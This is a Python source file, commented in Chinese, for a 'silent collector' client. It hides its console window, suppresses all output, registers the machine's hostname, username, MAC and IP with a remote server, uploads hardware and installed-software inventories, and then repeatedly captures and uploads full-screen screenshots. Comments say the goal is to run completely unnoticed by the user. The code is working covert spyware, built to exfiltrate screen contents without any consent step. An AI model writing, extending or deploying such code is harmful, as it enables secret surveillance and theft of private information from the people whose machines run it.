#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import socket
import platform
import argparse
import threading
import requests
import psutil
import hashlib
from datetime import datetime
from io import BytesIO
import subprocess

# Windows特定的导入
if platform.system() == 'Windows':
    try:
        import win32gui
        import win32ui
        import win32con
        import win32api
        from PIL import Image
        HAS_WINDOWS_DEPS = True
    except ImportError:
        HAS_WINDOWS_DEPS = False
else:
    HAS_WINDOWS_DEPS = False

class SilentCollector:
    def __init__(self, server_url, client_id=None, interval=10):
        """
        初始化静默收集器
        
        Args:
            server_url: 服务器URL (如: http://192.168.1.100:8000)
            client_id: 客户端ID (如果为None则自动生成)
            interval: 截图收集间隔时间（秒），默认设短一点以体现核心截图功能
        """
        self.server_url = server_url.rstrip('/')
        self.interval = interval
        self.running = False
        
        # 频率控制标志：确保软硬件信息每次运行/连接只发送一次
        self.has_sent_static_info = False
        
        # 获取系统基础信息
        self.hostname = socket.gethostname()
        try:
            self.username = os.getlogin()
        except:
            self.username = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
            
        self.os_info = platform.platform()
        self.mac_address = self._get_mac_address()
        
        # 客户端ID
        self.client_id = client_id or self._generate_client_id()
        
        # 会话保持
        self.session = requests.Session()
        self.session.timeout = 15
        
        # 隐藏窗口 (Windows下静默运行核心)
        if platform.system() == 'Windows':
            self._hide_console()
        
        # 彻底重定向输出，不发出任何控制台声响或写入
        self._redirect_output()
    
    def _hide_console(self):
        """静默运行：隐藏控制台窗口"""
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass
    
    def _redirect_output(self):
        """重定向输出到空设备，确保静默"""
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    
    def _generate_client_id(self):
        """生成客户端唯一ID"""
        unique_str = f"{self.hostname}_{self.mac_address}_{self.username}"
        return hashlib.md5(unique_str.encode()).hexdigest()[:12]
    
    def _get_mac_address(self):
        """获取MAC地址"""
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("getmac", shell=True).decode()
                for line in output.split('\n'):
                    if ':' in line and '-' in line:
                        return line.split()[0]
            else:
                import uuid
                return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                for elements in range(0, 8*6, 8)][::-1])
        except:
            pass
        return "unknown"
    
    def _get_ip_address(self):
        """获取IP地址"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(2)
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except:
            return "127.0.0.1"
    
    def register_client(self):
        """向服务器注册客户端"""
        client_info = {
            'client_id': self.client_id,
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os_info,
            'mac_address': self.mac_address,
            'ip_address': self._get_ip_address(),
            'platform': platform.system(),
            'processor': platform.processor(),
            'version': '2.0.0'
        }
        
        try:
            response = self.session.post(
                f"{self.server_url}/api/receive/register",
                json=client_info,
                timeout=10
            )
            return response.status_code == 200 and response.json().get('status') == 'success'
        except:
            return False
    
    def send_heartbeat(self):
        """发送心跳包"""
        try:
            response = self.session.post(
                f"{self.server_url}/api/receive/heartbeat",
                json={'client_id': self.client_id},
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    def collect_hardware_info(self):
        """收集硬件信息"""
        hardware_info = {
            'client_id': self.client_id,
            'timestamp': datetime.now().isoformat(),
            'system': {
                'hostname': self.hostname,
                'platform': platform.platform(),
                'processor': platform.processor(),
                'machine': platform.machine(),
                'architecture': platform.architecture()[0]
            },
            'cpu': {
                'physical_cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True),
            },
            'memory': {
                'total': psutil.virtual_memory().total,
            },
            'disks': []
        }
        
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                hardware_info['disks'].append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'total': usage.total,
                })
            except:
                pass
        return hardware_info
    
    def collect_software_info(self):
        """收集软件信息"""
        software_info = {
            'client_id': self.client_id,
            'timestamp': datetime.now().isoformat(),
            'software_list': []
        }
        
        # 简单获取部分安装程序（防止列表过长导致上报失败）
        if platform.system() == 'Windows':
            import winreg
            software_list = []
            registry_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
            ]
            for hive, path in registry_paths:
                try:
                    with winreg.OpenKey(hive, path) as key:
                        for i in range(0, min(100, winreg.QueryInfoKey(key)[0])):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                    if name and not any(s['name'] == name for s in software_list):
                                        software_list.append({'name': name})
                            except:
                                continue
                except:
                    continue
            software_info['software_list'] = software_list
        return software_info
    
    def capture_screenshot(self):
        """静默截取屏幕截图"""
        if not HAS_WINDOWS_DEPS or platform.system() != 'Windows':
            return None
        
        try:
            # 获取桌面窗口句柄
            hdesktop = win32gui.GetDesktopWindow()
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            
            # 创建设备上下文
            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc = img_dc.CreateCompatibleDC()
            
            # 创建位图对象
            screenshot = win32ui.CreateBitmap()
            screenshot.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(screenshot)
            
            # 复制屏幕内容到内存DC
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
            
            bmpinfo = screenshot.GetInfo()
            bmpstr = screenshot.GetBitmapBits(True)
            
            # 转换为PIL图像，并进行PNG压缩
            img = Image.frombuffer(
                'RGB',
                (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
                bmpstr, 'raw', 'BGRX', 0, 1
            )
            
            img_bytes = BytesIO()
            # 开启优化和压缩，减少网络传输消耗
            img.save(img_bytes, format='PNG', optimize=True, quality=60)
            screenshot_data = img_bytes.getvalue()
            
            # 释放DC资源（防止内存和句柄泄漏）
            mem_dc.DeleteDC()
            win32gui.DeleteObject(screenshot.GetHandle())
            img_dc.DeleteDC()
            win32gui.ReleaseDC(hdesktop, desktop_dc)
            
            return screenshot_data
        except Exception:
            return None
    
    def send_screenshot(self):
        """核心功能：静默发送屏幕截图到服务端"""
        try:
            screenshot_data = self.capture_screenshot()
            if not screenshot_data:
                return False
            
            metadata = {
                'client_id': self.client_id,
                'timestamp': datetime.now().isoformat(),
                'hostname': self.hostname,
                'username': self.username
            }
            
            files = {
                'file': ('screenshot.png', screenshot_data, 'image/png'),
                'metadata': (None, json.dumps(metadata), 'application/json')
            }
            
            response = self.session.post(
                f"{self.server_url}/api/receive/screenshot",
                files=files,
                timeout=20
            )
            return response.status_code == 200
        except:
            return False

    def collect_and_send(self):
        """控制执行：静态信息仅上报一次，核心截图每次循环都上报"""
        # 1. 始终维持心跳
        self.send_heartbeat()
        
        # 2. 如果是连接后的首次运行，静默上报一次软硬件静态信息
        if not self.has_sent_static_info:
            hw_ok = self.send_hardware_info()
            sw_ok = self.send_software_info()
            if hw_ok and sw_ok:
                self.has_sent_static_info = True # 标记为已发送，后续不再重复获取

        # 3. 核心功能：每次循环都抓取并静默回传截图
        self.send_screenshot()

    def send_hardware_info(self):
        try:
            info = self.collect_hardware_info()
            res = self.session.post(f"{self.server_url}/api/receive/hardware", json=info, timeout=10)
            return res.status_code == 200
        except:
            return False

    def send_software_info(self):
        try:
            info = self.collect_software_info()
            res = self.session.post(f"{self.server_url}/api/receive/software", json=info, timeout=10)
            return res.status_code == 200
        except:
            return False

    def run_daemon(self):
        """以守护进程（后台静默服务）方式运行"""
        self.running = True
        
        # 初始注册阶段
        registered = False
        while self.running and not registered:
            if self.register_client():
                registered = True
            else:
                time.sleep(5) # 注册失败时每5秒静默重试
        
        while self.running:
            try:
                start_time = time.time()
                self.collect_and_send()
                
                elapsed = time.time() - start_time
                sleep_time = max(1, self.interval - elapsed)
                time.sleep(sleep_time)
            except Exception:
                time.sleep(10) # 异常时静默等待10秒再试

    def stop(self):
        self.running = False

def main():
    parser = argparse.ArgumentParser(description='系统静默采集客户端')
    parser.add_argument('--server', required=True,default="http://192.168.1.103:8000", help='服务器地址 (如: http://192.168.1.100:8000)')
    parser.add_argument('--interval', type=int, default=60, help='截图收集与回传间隔时间（秒）')
    args = parser.parse_args()
    
    collector = SilentCollector(
        server_url=args.server,
        interval=args.interval
    )
    collector.run_daemon()

if __name__ == '__main__':
    # 注意：为了确保彻底的无感静默，移除了任何 IsUserAnAdmin 的提权校验
    main()